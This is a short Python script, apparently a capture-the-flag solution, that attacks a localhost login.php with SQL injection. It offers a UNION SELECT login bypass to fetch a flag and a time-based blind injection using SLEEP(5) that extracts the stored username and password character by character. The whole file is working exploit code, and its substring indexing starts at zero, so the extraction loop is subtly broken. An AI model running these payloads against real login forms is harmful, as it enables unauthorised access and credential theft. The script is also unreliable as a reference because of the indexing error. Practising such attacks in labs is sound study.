import requests

print("1. just get the flag")
print("2. get the username and password")
choice = input("what do you want to do: ")

if choice == "1":
    res = requests.post("http://localhost/login.php", data={"username": "' UNION SELECT 'username', 'password' -- ", "password": "password"})
    print(res.text)

if choice == "2":
    avail_chars = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    correct_username = ""
    correct_password = ""
    i = 1
    for i in range(10):
        for char in avail_chars:
            res = requests.post("http://localhost/login.php", data={"username": f"' OR IF(ASCII(SUBSTRING(username, {i}, {i})) = ASCII('{char}'), SLEEP(5), 0) -- ", "password": "password"})
            if res.elapsed.total_seconds() >= 5:
                correct_username += char
                break

    for i in range(10):
        for char in avail_chars:
            res = requests.post("http://localhost/login.php", data={"username": f"' OR IF(ASCII(SUBSTRING(password, {i}, {i})) = ASCII('{char}'), SLEEP(5), 0) -- ", "password": "password"})
            if res.elapsed.total_seconds() >= 5:
                correct_password += char
                break
        
    print(f"username : {correct_username}")
    print(f"password : {correct_password}")
